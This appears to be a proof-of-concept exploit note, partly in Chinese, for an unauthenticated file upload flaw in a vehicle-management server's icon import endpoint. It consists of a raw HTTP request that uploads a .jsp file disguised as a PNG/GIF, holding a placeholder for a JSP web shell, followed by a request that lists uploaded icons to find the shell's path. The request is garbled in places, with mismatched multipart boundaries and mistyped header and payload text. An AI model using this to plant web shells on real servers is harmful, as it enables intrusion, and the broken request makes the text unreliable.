```
POST /vehicleServer/carDev/icon/import/1?iconType=1 HTTP/1.1 
Host: ip:port
Accept: */*
Accept-Encoding: gzip， deflate， br
Content-Length: 872
Content-Type: multipart/form-data; boundary=----63766573e5aegeegaa8cesaea4 
User-Agent: Mozilla/5.0 (Windows NT 6.2: Win64: X64) Applewebkit/537.36 (KHTML, like Gecko) QtwebEngine/5.9.1 Chrome/56.0.2924.122 Safari/537.36

------63766573e5aegeegaa8cesaea4
Content-Disposition: form-data; name="file"; filename="test.jsp" 
Content-ype: image/png

GIF89a
<%isp 马%> 
------63766573e5ae9ee9aa8ce5aea4
```

获取路径:

```
GET /vehicleServer/carDev/icon/getIconList?nowTime=164605907220
```



